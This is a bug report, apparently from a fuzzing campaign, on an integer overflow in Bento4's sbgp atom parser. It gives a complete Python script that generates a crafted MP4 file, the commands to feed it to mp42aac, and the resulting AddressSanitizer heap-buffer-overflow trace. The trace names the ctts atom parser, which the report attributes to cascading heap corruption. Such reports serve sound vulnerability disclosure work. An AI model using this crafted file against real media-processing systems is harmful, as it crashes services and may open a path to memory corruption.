## Bug0: AP4_SbgpAtom integer overflow in bounds-check expression bypasses guard and causes heap corruption

In `AP4_SbgpAtom::AP4_SbgpAtom()` in Ap4SbgpAtom.cpp, the bounds-check expression `entry_count * 8` performs 32-bit unsigned multiplication without overflow detection, so when `entry_count` is `0x20000000` the product wraps to zero and the guard is always bypassed, allowing an unconstrained heap allocation followed by out-of-bounds reads that corrupt heap state.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def box(btype, data):
    return struct.pack('>I', 4 + 4 + len(data)) + btype + data

def full_box(btype, version, flags, data):
    return box(btype, struct.pack('>B', version) + struct.pack('>I', flags)[1:] + data)

# sbgp full atom: entry_count=0x20000000 causes entry_count*8 to wrap to 0 (32-bit overflow)
entry_count = 0x20000000
grouping_type = b'seig'
fake_entry = struct.pack('>II', 1, 1)
sbgp_data = grouping_type + struct.pack('>I', entry_count) + fake_entry
sbgp = full_box(b'sbgp', 0, 0, sbgp_data)

stsd = full_box(b'stsd', 0, 0, struct.pack('>I', 0))
stts = full_box(b'stts', 0, 0, struct.pack('>I', 0))
stbl = box(b'stbl', stsd + stts + sbgp)

url_entry = full_box(b'url ', 0, 1, b'')
dref = full_box(b'dref', 0, 0, struct.pack('>I', 1) + url_entry)
dinf = box(b'dinf', dref)

smhd = full_box(b'smhd', 0, 0, struct.pack('>HH', 0, 0))
minf = box(b'minf', smhd + dinf + stbl)

mdhd_data = struct.pack('>IIII', 0, 0, 44100, 0) + struct.pack('>HH', 0, 0)
mdhd = full_box(b'mdhd', 0, 0, mdhd_data)

hdlr_data = struct.pack('>I', 0) + b'soun' + b'\x00'*12 + b'SoundHandler\x00'
hdlr = full_box(b'hdlr', 0, 0, hdlr_data)

mdia = box(b'mdia', mdhd + hdlr + minf)

tkhd_data = struct.pack('>IIII', 0, 0, 1, 0)
tkhd_data += struct.pack('>II', 0, 0) + b'\x00'*8
tkhd_data += struct.pack('>HH', 0, 0) + struct.pack('>H', 0x0100) + b'\x00'*2
tkhd_data += struct.pack('>9i', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
tkhd_data += struct.pack('>II', 0, 0)
tkhd = full_box(b'tkhd', 0, 3, tkhd_data)

trak = box(b'trak', tkhd + mdia)

mvhd_data = struct.pack('>IIII', 0, 0, 1000, 0)
mvhd_data += struct.pack('>I', 0x00010000)
mvhd_data += struct.pack('>H', 0x0100) + b'\x00'*10
mvhd_data += struct.pack('>9i', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
mvhd_data += b'\x00'*24 + struct.pack('>I', 0xFFFFFFFF)
mvhd = full_box(b'mvhd', 0, 0, mvhd_data)

moov = box(b'moov', mvhd + trak)
ftyp = box(b'ftyp', b'mp42' + struct.pack('>I', 0) + b'mp42' + b'isom')

data = ftyp + moov
with open('poc_input.mp4', 'wb') as f:
    f.write(data)
print(f"[+] Written poc_input.mp4 ({len(data)} bytes)")
print(f"[+] entry_count=0x{entry_count:08X} -> entry_count*8=0x{(entry_count*8)&0xFFFFFFFF:08X} (32-bit overflow)")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x5020000000f8 at pc 0x564a2bba8140 bp 0x7ffcece10870 sp 0x7ffcece10860
READ of size 1 at 0x5020000000f8 thread T0
    #0 0x564a2bba813f in AP4_CttsAtom::AP4_CttsAtom(unsigned int, unsigned char, unsigned int, AP4_ByteStream&) (mp42aac+0xaa113f)
    #1 0x564a2bba9087 in AP4_CttsAtom::Create(unsigned int, AP4_ByteStream&) (mp42aac+0xaa2087)

### Impact

An attacker who supplies a crafted MP4 file to any invocation of mp42aac can trigger integer overflow in the `sbgp` atom parser, causing the size guard to be silently bypassed and the parser to call `SetItemCount(0x20000000)` on a heap array backed by an overflowed allocation. The resulting heap corruption cascades into an out-of-bounds read in the next atom parsed, producing a confirmed heap-buffer-overflow that terminates the process and constitutes a reliable denial-of-service condition. On 32-bit builds where the overflowed allocation may return a non-null pointer, subsequent indexed writes into the undersized array raise the risk to potential arbitrary code execution.
